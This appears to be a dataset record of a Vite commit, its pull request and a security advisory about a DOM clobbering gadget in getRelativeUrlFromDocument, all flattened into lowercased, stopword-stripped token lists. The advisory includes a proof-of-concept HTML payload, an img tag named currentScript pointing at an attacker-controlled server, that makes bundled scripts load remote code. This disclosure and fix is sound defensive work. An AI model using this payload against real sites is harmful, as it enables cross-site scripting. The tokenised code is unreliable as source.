{
  "commit_index": "ade1d89",
  "commit_url": "https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad",
  "commit": {
    "commit_message": [
      "fix",
      "avoid",
      "dom",
      "clobbering",
      "gadget",
      "getrelativeurlfromdocument",
      "18\u2026"
    ],
    "description": [],
    "changed_files_count": 1,
    "changed_files": [
      "packages/vite/src/node/build.ts"
    ],
    "changed_files_content": [],
    "parent": "9d2413c8b64bfb1dfd953340b4e1b5972d5440aa"
  },
  "pull_requests": [
    {
      "pr_title": [
        "fix",
        "avoid",
        "dom",
        "clobbering",
        "gadget",
        "ingetrelativeurlfromdocument",
        "18115"
      ],
      "total_discussions": 5,
      "discussions": [
        {
          "discussion_number": 1,
          "comments": [
            {
              "type": "pr_description",
              "content": [
                "descriptionthis",
                "patch",
                "fix",
                "dom",
                "clobbering",
                "gadget",
                "thegetrelativeurlfromdocumentfunction.reference",
                "ghsa-64vr-g452-qvp3"
              ],
              "author": "patak-dev"
            }
          ]
        },
        {
          "discussion_number": 2,
          "comments": [
            {
              "content": [
                "run",
                "review",
                "pull",
                "request",
                "instackblitz",
                "codeflow"
              ]
            }
          ]
        },
        {
          "discussion_number": 3,
          "comments": [
            {
              "content": [
                "/ecosystem-ci",
                "run"
              ]
            }
          ]
        },
        {
          "discussion_number": 4,
          "comments": [
            {
              "content": [
                "ran",
                "ecosystem",
                "ci",
                "on84b30b3",
                "open",
                "\u2705analogjs",
                "astro",
                "ladle",
                "laravel",
                "marko",
                "previewjs",
                "quasar",
                "qwik",
                "rakkas",
                "redwoodjs",
                "storybook",
                "unocss",
                "vite-environment-examples",
                "vite-plugin-pwa",
                "vite-plugin-react",
                "vite-plugin-react-swc",
                "vite-plugin-svelte",
                "vite-plugin-vue",
                "vite-setup-catalogue",
                "vitepress",
                "vitest",
                "vuepress"
              ]
            }
          ]
        },
        {
          "discussion_number": 5,
          "comments": [
            {
              "content": [
                "ran",
                "ecosystem",
                "ci",
                "on84b30b3",
                "open",
                "\u2705analogjs",
                "astro",
                "ladle",
                "laravel",
                "marko",
                "nuxt",
                "previewjs",
                "quasar",
                "qwik",
                "rakkas",
                "redwoodjs",
                "storybook",
                "unocss",
                "vite-environment-examples",
                "vite-plugin-pwa",
                "vite-plugin-react",
                "vite-plugin-react-swc",
                "vite-plugin-svelte",
                "vite-plugin-vue",
                "vite-setup-catalogue",
                "vitepress",
                "vitest",
                "vuepress"
              ]
            }
          ]
        }
      ]
    }
  ],
  "issues": null,
  "security": [
    {
      "title": [
        "dom",
        "clobbering",
        "gadget",
        "found",
        "vite",
        "bundled",
        "script",
        "lead",
        "xss"
      ],
      "content": [
        "hi",
        "vite",
        "developer",
        "team",
        "summary",
        "discovered",
        "dom",
        "clobbering",
        "vulnerability",
        "vite",
        "building",
        "script",
        "cjs",
        "iife",
        "umd",
        "output",
        "format",
        "dom",
        "clobbering",
        "gadget",
        "module",
        "lead",
        "cross-site",
        "scripting",
        "xss",
        "web",
        "page",
        "scriptless",
        "attacker-controlled",
        "html",
        "element",
        "e.g.",
        "img",
        "tag",
        "unsanitized",
        "name",
        "attribute",
        "present",
        "note",
        "identified",
        "similar",
        "security",
        "issue",
        "webpack",
        "ghsa-4vvj-4cpr-p986",
        "detail",
        "background",
        "dom",
        "clobbering",
        "type",
        "code-reuse",
        "attack",
        "attacker",
        "first",
        "embeds",
        "piece",
        "non-script",
        "seemingly",
        "benign",
        "html",
        "markup",
        "webpage",
        "e.g",
        "post",
        "comment",
        "leverage",
        "gadget",
        "piece",
        "j",
        "code",
        "living",
        "existing",
        "javascript",
        "code",
        "transform",
        "executable",
        "code",
        "information",
        "dom",
        "clobbering",
        "reference",
        "1",
        "http",
        "//scnps.co/papers/sp23_domclob.pdf",
        "2",
        "http",
        "//research.securitum.com/xss-in-amp4email-dom-clobbering/",
        "gadget",
        "found",
        "vite",
        "identified",
        "dom",
        "clobbering",
        "vulnerability",
        "vite",
        "bundled",
        "script",
        "particularly",
        "script",
        "dynamically",
        "import",
        "script",
        "asset",
        "folder",
        "developer",
        "set",
        "build",
        "output",
        "format",
        "cjs",
        "iife",
        "umd",
        "case",
        "vite",
        "replaces",
        "relative",
        "path",
        "starting",
        "__vite_asset__",
        "using",
        "url",
        "retrieved",
        "document.currentscript",
        "however",
        "implementation",
        "vulnerable",
        "dom",
        "clobbering",
        "attack",
        "document.currentscript",
        "lookup",
        "shadowed",
        "attacker",
        "via",
        "browser",
        "'s",
        "named",
        "dom",
        "tree",
        "element",
        "access",
        "mechanism",
        "manipulation",
        "allows",
        "attacker",
        "replace",
        "intended",
        "script",
        "element",
        "malicious",
        "html",
        "element",
        "happens",
        "src",
        "attribute",
        "attacker-controlled",
        "element",
        "used",
        "url",
        "importing",
        "script",
        "potentially",
        "leading",
        "dynamic",
        "loading",
        "script",
        "attacker-controlled",
        "server",
        "const",
        "relativeurlmechanisms",
        "amd",
        "relativepath",
        "relativepath",
        "0",
        "==",
        "relativepath",
        "relativepath",
        "return",
        "getresolveurl",
        "require.tourl",
        "escapeid",
        "relativepath",
        "document.baseuri",
        "cjs",
        "relativepath",
        "typeof",
        "document",
        "===",
        "'undefined",
        "getfileurlfromrelativepath",
        "relativepath",
        "getrelativeurlfromdocument",
        "relativepath",
        "e",
        "relativepath",
        "getresolveurl",
        "escapeid",
        "partialencodeuripath",
        "relativepath",
        "import.meta.url",
        "iife",
        "relativepath",
        "getrelativeurlfromdocument",
        "relativepath",
        "//",
        "note",
        "make",
        "sure",
        "rollup",
        "generate",
        "module",
        "params",
        "system",
        "relativepath",
        "getresolveurl",
        "escapeid",
        "partialencodeuripath",
        "relativepath",
        "module.meta.url",
        "umd",
        "relativepath",
        "typeof",
        "document",
        "===",
        "'undefined",
        "typeof",
        "location",
        "===",
        "'undefined",
        "getfileurlfromrelativepath",
        "relativepath",
        "getrelativeurlfromdocument",
        "relativepath",
        "true",
        "poc",
        "considering",
        "website",
        "contains",
        "following",
        "main.js",
        "script",
        "devloper",
        "decides",
        "use",
        "vite",
        "bundle",
        "program",
        "following",
        "configuration",
        "//",
        "main.js",
        "import",
        "extraurl",
        "'./extra.js",
        "url",
        "var",
        "document.createelement",
        "'script",
        "s.src",
        "extraurl",
        "document.head.append",
        "//",
        "extra.js",
        "export",
        "default",
        "http",
        "//myserver/justanother.js",
        "//",
        "vite.config.js",
        "import",
        "defineconfig",
        "'vite",
        "export",
        "default",
        "defineconfig",
        "build",
        "assetsinlinelimit",
        "0",
        "//",
        "avoid",
        "inline",
        "asset",
        "poc",
        "rollupoptions",
        "output",
        "format",
        "cjs",
        "base",
        "running",
        "build",
        "command",
        "developer",
        "get",
        "following",
        "bundle",
        "output",
        "//",
        "dist/index-ddmig9vd.js",
        "use",
        "strict",
        "const",
        "t=",
        "typeof",
        "document",
        "u",
        "require",
        "url",
        ".pathtofileurl",
        "__dirname+",
        "/extra-blvex9lb.js",
        ".href",
        "new",
        "url",
        "extra-blvex9lb.js",
        "document.currentscript",
        "document.currentscript.src||document.baseuri",
        ".href",
        "var",
        "e=document.createelement",
        "script",
        "e.src=t",
        "document.head.append",
        "e",
        "adding",
        "vite",
        "bundled",
        "script",
        "dist/index-ddmig9vd.js",
        "part",
        "web",
        "page",
        "source",
        "code",
        "page",
        "could",
        "load",
        "extra.js",
        "file",
        "attacker",
        "'s",
        "domain",
        "attacker.controlled.server",
        "attacker",
        "need",
        "insert",
        "img",
        "tag",
        "name",
        "attribute",
        "set",
        "currentscript",
        "done",
        "website",
        "'s",
        "feature",
        "allows",
        "user",
        "embed",
        "certain",
        "script-less",
        "html",
        "e.g.",
        "markdown",
        "renderers",
        "web",
        "email",
        "client",
        "forum",
        "via",
        "html",
        "injection",
        "vulnerability",
        "third-party",
        "javascript",
        "loaded",
        "page",
        "doctype",
        "html",
        "html",
        "head",
        "title",
        "vite",
        "example",
        "/title",
        "--",
        "attacker-controlled",
        "script-less",
        "html",
        "element",
        "start",
        "--",
        "img",
        "name=",
        "currentscript",
        "src=",
        "http",
        "//attacker.controlled.server/",
        "/img",
        "--",
        "attacker-controlled",
        "script-less",
        "html",
        "element",
        "end",
        "--",
        "/head",
        "script",
        "type=",
        "module",
        "crossorigin",
        "src=",
        "/assets/index-ddmig9vd.js",
        "/script",
        "body",
        "/body",
        "/html",
        "impact",
        "vulnerability",
        "result",
        "cross-site",
        "scripting",
        "xss",
        "attack",
        "website",
        "include",
        "vite-bundled",
        "file",
        "configured",
        "output",
        "format",
        "cjs",
        "iife",
        "umd",
        "allow",
        "user",
        "inject",
        "certain",
        "scriptless",
        "html",
        "tag",
        "without",
        "properly",
        "sanitizing",
        "name",
        "id",
        "attribute",
        "patch",
        "//",
        "http",
        "//github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts",
        "l1296",
        "const",
        "getrelativeurlfromdocument",
        "relativepath",
        "string",
        "umd",
        "false",
        "getresolveurl",
        "escapeid",
        "partialencodeuripath",
        "relativepath",
        "umd",
        "typeof",
        "document",
        "===",
        "'undefined",
        "location.href",
        "document.currentscript",
        "document.currentscript.tagname.touppercase",
        "===",
        "'script",
        "document.currentscript.src",
        "||",
        "document.baseuri"
      ]
    }
  ]
}